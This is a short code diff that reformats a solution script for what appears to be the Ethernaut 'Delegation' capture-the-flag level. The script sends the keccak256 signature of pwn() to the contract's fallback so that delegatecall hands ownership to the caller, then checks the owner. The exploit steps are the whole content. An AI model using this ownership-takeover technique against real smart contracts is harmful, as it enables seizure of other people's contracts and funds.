@@ -14,11 +14,11 @@ Tools needed for this level:
 */
 
 // Get function signature of the pwn() function we want to execute via delegateCall
-const pwnSig = web3.utils.keccak256('pwn()');
+const pwnSig = web3.utils.keccak256("pwn()")
 
 // Execute the fallback function of Delegation contract with sendTransaction(),
 // passing the signature obtained as the data
-await contract.sendTransaction({data: pwnSig});
+await contract.sendTransaction({ data: pwnSig })
 
 // Check if owner has changed
-await contract.owner();
+await contract.owner()
